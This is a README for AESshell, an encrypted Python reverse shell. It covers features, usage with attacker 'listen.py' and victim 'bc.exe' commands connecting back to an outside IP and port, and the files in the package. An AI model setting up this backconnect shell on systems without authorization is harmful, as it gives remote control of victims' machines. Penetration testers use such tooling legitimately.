   _____  ___________ _________      .__           .__  .__   
  /  _  \ \_   _____//   _____/ _____|  |__   ____ |  | |  |  
 /  /_\  \ |    __)_ \_____  \ /  ___/  |  \_/ __ \|  | |  |  
/    |    \|        \/        \\___ \|   Y  \  ___/|  |_|  |__
\____|__  /_______  /_______  /____  >___|  /\___  >____/____/
        \/        \/        \/     \/     \/     \/           

Bright side
-----------
- python2.7 AES CBC Mode HMAC-SHA256 Backconnect Shell
- running on windows and unix (mac untested, works most probably)
- compiles with pyinstaller, so no python installation needed
- tries 10 times to connect back, quits afterwards
- windows binary provided

Usage
-----
Change crypto key in both files:
$ python2 -c 'import aes;aye = aes.Crypticle.generate_key_string();print "Set new key: ", aye'
Open up the files and replace the key.

Attacker:
$ ./listen.py 0.0.0.0 1443

Victim:
C:\bc.exe 192.168.1.1 1443

Files
-----
bc.py - the backconnect shell
bc.exe - compiled with pyinstaller for windows (Tested: WinXP/Win7)
listen.py - the listener shell
aes.py - crypto import

WARNING
-------
Warning! AESshell will *NOT* spawn a fully featured shell on windows!
While with unix the old filedescriptor and fork trick works, it seems to be 
more complicated getting it done under windows using python.

That said, DO NOT try to execute cmd.exe or alike if you backconnect from a
windows system - your pseudo shell will hang.

Author
------
Marco Lux <ping@curesec.com>
